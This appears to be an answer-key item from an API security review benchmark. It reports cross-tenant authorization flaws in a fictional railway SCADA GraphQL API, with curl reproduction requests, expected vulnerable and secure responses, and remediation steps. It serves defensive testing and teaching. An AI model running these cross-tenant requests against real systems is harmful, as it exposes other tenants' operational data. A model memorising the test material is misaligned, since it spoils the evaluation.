# Expected Response

## System
- Domain: Railway / SCADA
- System: RailCore Operations API
- Example ID: GQL-0038

## Priority Findings

### Finding 1: Cross-Tenant Graph Traversal Injection via listResources + getResourceWithChildren — No Per-Level Auth Re-validation (Pattern 5.2)
**Severity:** Critical
**Category:** Injection / BOLA

**Summary:**
The `listResources` query on `POST /graphql` accepts a caller-supplied `tenantId`, allowing `tenant-a157` to enumerate SCADA records belonging to `tenant-3142`. Beyond the initial read, the `getResourceWithChildren` query (§3.0) traverses nested `items` relationships from the fetched resource without re-validating authorization at each resolver level. An attacker can use a cross-tenant `resourceId` obtained from the initial enumeration to traverse the entire child graph of a victim tenant's SCADA topology, accessing operational records across the resolver chain.

**Evidence from HAR:**
- Request: `POST https://api.railcore-operations-.example.com/graphql` (2026-04-13T16:22:34Z, 226 ms)
- JWT `x-tenant-id`: `tenant-a157` — attacker's identity
- Query payload: `listResources(tenantId: "tenant-3142") { resourceId ownerId data { sensitiveField } }` — attacker enumerates victim tenant's resources
- Response HTTP status: `200 OK` — no authorization error
- Response `tenantId`: `tenant-3142` — cross-tenant SCADA data returned
- Response `ownerId`: `other-user-a1573142`
- Response `sensitiveField`: `CONFIDENTIAL-a1573142`
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-a1573142`

**Root Cause (§4.0 RISK-GQL-038 + §5.0):** The resolver chain does not re-validate authorization at nested levels. §5.0: "The GraphQL resolver chain follows nested relationships without re-validating authorization at each level. An attacker can traverse from an authorized resource to related child objects across tenant boundaries." The `listResources` accepts attacker-supplied `tenantId` without JWT boundary enforcement; `getResourceWithChildren` then follows `items` relationships for the same cross-tenant resource without checking tenancy at the child resolver level.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-038 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §5.0 | Pattern 5.2 | "resolver chain follows nested relationships without re-validating authorization at each level" |
| context.txt §3.0 | `getResourceWithChildren` | Returns `Resource` with nested `items: [Item!]` — traversal point |
| HAR entry | request.postData | `listResources(tenantId: "tenant-3142")` from `tenant-a157` |
| HAR entry | response.content | `tenantId: "tenant-3142"`, `sensitiveField: "CONFIDENTIAL-a1573142"` — cross-tenant data |

---

### Finding 2: Cross-Tenant Bulk Enumeration via bulkResourceLookup (Pattern 1.9)
**Severity:** High
**Category:** BOLA / Mass Enumeration

**Root Cause (§4.0):** "The `bulkResourceLookup` mutation accepts an arbitrary array of IDs without per-ID ownership filtering."

---

## Steps to Reproduce

### Step 1 — Confirm attacker baseline (own tenant)
```bash
curl -s -X POST https://api.railcore-operations-.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-a157" \
  -d '{"query": "query { listResources(tenantId: \"tenant-a157\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Expected:** Returns only `tenant-a157` SCADA records.

### Step 2 — Cross-tenant initial enumeration (HAR attack)
```bash
curl -s -X POST https://api.railcore-operations-.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-a157" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-3142\") { resourceId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-3142"`, `ownerId: "other-user-a1573142"`, `sensitiveField: "CONFIDENTIAL-a1573142"`, `internalNotes: "Internal data exposed"` — cross-tenant SCADA data disclosed.
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden"}], "data": {"listResources": null}}`.

### Step 3 — Graph traversal injection: enumerate child items of cross-tenant resource
```bash
# Use a resourceId obtained from Step 2 to traverse nested items
curl -s -X POST https://api.railcore-operations-.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-a157" \
  -d '{"query": "query { getResourceWithChildren(id: \"other-user-a1573142\") { resourceId tenantId items { ... on Item { id data } } } }"}'
```
**Vulnerable outcome:** Returns the parent resource (`tenant-3142`) plus all nested `items` child objects — full SCADA topology of the victim tenant accessible through single traversal.
**Secure outcome:** HTTP 403 or FORBIDDEN at each resolver level that encounters a cross-tenant object.

### Step 4 — Bulk cross-tenant enumeration
```bash
curl -s -X POST https://api.railcore-operations-.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-a157" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-3142-001\", \"R-3142-002\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns SCADA records from `tenant-3142` in bulk.
**Secure outcome:** Only own-tenant records returned; cross-tenant IDs yield null or FORBIDDEN.

## Secure Outcome Verification
For **Step 2**, a correctly patched implementation MUST return:
```json
{
  "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }],
  "data": { "listResources": null }
}
```

## Remediation
1. **Strip tenantId from listResources input:** Derive tenant scope exclusively from the JWT. The `tenantId` argument must not be accepted from the caller.
2. **Re-validate authorization at each resolver level:** In `getResourceWithChildren`, before resolving `items`, verify `tenant_id = $jwt.tenantId` for each child object. Do not propagate parent authorization to children.
3. **Resolver-level tenant guard on getResource/listResources:** Apply `WHERE tenant_id = $jwt.tenantId` at every fetch point (§4.0 RISK-GQL-038).
4. **Per-ID ownership filter in bulkResourceLookup:** Post-fetch, reject any result whose `tenant_id` ≠ JWT's `tenantId`.
5. **Redis cache key includes tenantId:** §2.0 caches by `resourceId` only — change to `resourceId:tenantId`.
6. **Automated regression tests:** Assert that `getResourceWithChildren` on a cross-tenant `resourceId` returns FORBIDDEN at both the root and `items` resolver levels.
